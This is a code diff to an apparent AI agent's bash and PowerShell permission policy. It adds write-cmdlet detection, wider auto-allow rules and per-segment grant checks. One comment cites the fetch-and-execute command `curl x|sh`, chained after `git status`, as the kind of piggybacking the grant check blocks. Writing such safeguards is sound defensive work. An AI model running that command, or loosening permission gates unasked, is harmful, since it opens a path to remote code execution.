@@ -17,8 +17,12 @@ import contextvars
 from dataclasses import dataclass
 
 from permissions.bash_policy import (
+	BASH_DEV_TOOL_ALLOW,
+	BASH_READONLY_BROAD,
+	bash_auto_allow_reason,
 	bash_deny_extra,
 	bash_deny_reason,
+	bash_grant_admissible,
 	bash_readonly_allow,
 	bash_rule_ask_deny,
 	bash_secret_read_reason,
@@ -244,6 +248,14 @@ def begin_permission_turn(session_id: str) -> None:
 			else _default_permission_mode()
 		)
 		get_runtime_mode_store().begin_turn(session_id, default)
+		try:
+			from permissions.trace import current_permission_snapshot
+			from engine.workspace_context import update_execution_context
+
+			row = current_permission_snapshot(session_id=session_id)
+			update_execution_context(permission_snapshot_id=row["snapshot_id"])
+		except Exception:
+			pass
 	except Exception:
 		# 若 store 不可用则降级为旧行为（纯 body/config 判定），不阻塞回合。
 		pass
@@ -745,7 +757,18 @@ _BASH_REDIRECT_RX = re.compile(
 _BASH_WRITE_CMD_RX = re.compile(
 	r"\b(?:tee|dd)\b|\bsed\s+-i\b|\bperl\s+-pi\w*\b|"
 	r"\b(?:cp|mv|touch|mkdir|rmdir|rm)\s+|\bcurl\s+(?:-[^\s]*o|-o)\b|"
-	r"\bwget\s+(?:-O|--output-document)\b",
+	r"\bwget\s+(?:-O|--output-document)\b|"
+	# 2026-09-20：PowerShell 写 cmdlet（Windows 上默认 shell 就是 pwsh，
+	# 原先只认 POSIX 写命令 ⇒ `New-Item`/`Set-Content` 走不到「写目标证明」，
+	# 只能默认 ASK）。识别后与 `cp`/`mkdir` 同档：区内证明 → ALLOW，区外 → DENY。
+	r"\b(?:new-item|set-item|set-itemproperty|new-itemproperty|copy-item|move-item|"
+	r"rename-item|remove-item|set-content|add-content|clear-content|out-file|"
+	r"export-csv|tee-object)\b",
+	re.I,
+)
+#: PowerShell 写 cmdlet 的显式目标参数（优先于「最后 token」兜底）。
+_PS_WRITE_PATH_RX = re.compile(
+	r"-(?:path|literalpath|destination|filepath|outfile|name)\s+(\"[^\"]+\"|'[^']+'|\S+)",
 	re.I,
 )
 _BASH_INTERP_RX = re.compile(
@@ -770,6 +793,10 @@ def _bash_write_target(command: str) -> str | None:
 	m = _BASH_PY_OPEN_RX.search(command)
 	if m and re.search(r"[\"']w|[\"']a|[\"']r\+|[\"']wb|[\"']ab", command, re.I):
 		return m.group(1).strip()
+	# PowerShell 写 cmdlet 的显式目标参数（`Set-Content -Path x -Value y`）。
+	ps = _PS_WRITE_PATH_RX.search(command)
+	if ps:
+		return ps.group(1).strip().strip("\"'")
 	toks = re.split(r"\s+", command.strip())
 	cands = [
 		t for t in toks
@@ -825,7 +852,7 @@ def _evaluate_bash(
 	cwd: str,
 	roots: list[str],
 ) -> PolicyDecision:
-	"""Bash：黑名单 DENY → 密钥 DENY → 规则 DENY(T7) → 策略文件 DENY → 仓库/远程策略 → peer git → 只读白名单(规则驱动) → 规则 ASK(T7) → 写目标证明 → 默认 ASK。"""
+	"""Bash：黑名单 DENY → 密钥 DENY → 规则 DENY(T7) → 策略文件 DENY → 仓库/远程策略 → peer git → 只读白名单(严格,规则驱动) → **只读管道/PSh 只读 cmdlet/本地开发工具类(2026-09-20 放宽)** → 规则 ASK(T7) → 写目标证明 → 默认 ASK。"""
 	pol = load_workspace_policy(cwd)
 	denied = bash_deny_reason(command) or bash_deny_extra(command, list(pol.deny_commands))
 	if denied:
@@ -916,13 +943,33 @@ def _evaluate_bash(
 			prompt=_prompt_for_bash(command),
 		)
 
-	if bash_mode == "ask" or remote:
-		# 远程 / 策略 ask：一律确认（黑名单已拦）——T26 出厂决策：含只读命令，
-		# 默认全确认；白名单仅在 bash_mode=default / worker 只读沙箱生效。
+	if remote:
+		# 远程（微信 / 文件助手）2026-09-20 放宽一半：**只读类**同样自动放行
+		# （读操作不改变任何状态）；dev 类（会执行工作区代码）仍逐条确认 ——
+		# 远程输入是不可信渠道（T_now 侧标 untrusted），静默执行任意代码等于把
+		# 远端消息变成 RCE 入口。remote_bash=deny 更早的分支已终态 DENY。
+		# 注意顺序：远程会话的 bash_mode 已被上面改写成 remote_bash(=ask)，
+		# 故本分支必须在下面的 bash_mode=="ask" 之前。
+		if bash_auto_allow_reason(command, cwd=cwd) == BASH_READONLY_BROAD:
+			return PolicyDecision(
+				decision=PermissionDecision.ALLOW,
+				reason="bash_remote_readonly",
+				matched_rule="bash_remote_readonly_allow",
+			)
 		return PolicyDecision(
 			decision=PermissionDecision.ASK,
 			reason="needs_confirmation",
-			matched_rule="bash_policy_ask" if not remote else "bash_remote_ask",
+			matched_rule="bash_remote_ask",
+			prompt=_prompt_for_bash(command),
+		)
+
+	if bash_mode == "ask":
+		# 工作区显式 bash=ask / 坏策略文件回退档：一律确认（黑名单已拦）——这是
+		# 用户侧「全确认」逃生门，放宽面（下方 bash_auto_allow_reason）不在此档生效。
+		return PolicyDecision(
+			decision=PermissionDecision.ASK,
+			reason="needs_confirmation",
+			matched_rule="bash_policy_ask",
 			prompt=_prompt_for_bash(command),
 		)
 
@@ -942,6 +989,20 @@ def _evaluate_bash(
 			decision=PermissionDecision.ALLOW,
 			reason="bash_readonly_allow",
 			matched_rule="bash_readonly_allow",
+		)
+
+	# 2026-09-20（用户裁定放宽）：只读管道/链、PowerShell 只读 cmdlet、
+	# 本地构建/测试/依赖/格式化类工具同样自动放行 —— 判定在
+	# permissions.bash_readonly（结构化、fail-closed：未知程序 / 重定向 /
+	# $() / 后台 & / 包装器 一律不放行）。密钥读与工作区 ask/deny 规则仍最严。
+	# 「逐条确认」档（always）只压 dev 类：跑代码类命令仍需逐条点头；只读类
+	# 与旧只读白名单口径一致，照常放行。
+	broad = bash_auto_allow_reason(command, cwd=cwd)
+	if broad and not (broad == BASH_DEV_TOOL_ALLOW and permission_mode() == "always"):
+		return PolicyDecision(
+			decision=PermissionDecision.ALLOW,
+			reason=broad,
+			matched_rule=broad,
 		)
 
 	if bash_mode == "allow":
@@ -1345,21 +1406,6 @@ def evaluate_policy(
 			return decision  # 远程会话不得静默放行（§34 不变量）
 		if permission_mode() == "always":
 			return decision  # 用户显式要求逐条确认
-		# G29: Bash 组合/多语句/写重定向命令不得吃「前缀 token」grant——
-		# `git status && curl x|sh` 不能命中 `git status` 的 always-allow。
-		if (name or "").strip().lower() == "bash":
-			try:
-				from permissions.bash_policy import bash_command_is_composite
-
-				cmd = ""
-				if isinstance(tool_input, dict):
-					_c = tool_input.get("command")
-					if isinstance(_c, str):
-						cmd = _c
-				if bash_command_is_composite(cmd):
-					return decision
-			except Exception:
-				return decision
 		fp = grant_fingerprint(
 			name,
 			tool_input,
@@ -1368,6 +1414,21 @@ def evaluate_policy(
 		)
 		if not fp:
 			return decision
+		# G29（2026-09-20 放宽口径）：grant 按「逐段前缀匹配」准入 —— 每一段都必须
+		# 以该指纹（program + 首参数）的 token 序列开头，且结构可判（无重定向 /
+		# `$()` / 后台 &）。于是 `git status && curl x|sh` 蹭不到 `git status` 的
+		# 授权，而 `npm install a && npm install b` 可以被「不再询问此类命令」记住。
+		if (name or "").strip().lower() == "bash":
+			try:
+				cmd = ""
+				if isinstance(tool_input, dict):
+					_c = tool_input.get("command")
+					if isinstance(_c, str):
+						cmd = _c
+				if not bash_grant_admissible(cmd, fp):
+					return decision
+			except Exception:
+				return decision
 		# 存取同一身份：网关调用按解析后的目标注册名匹配（control.py 落库同源）。
 		identity_name = (
 			str(getattr(decision, "mcp_target", "") or "").strip() or name
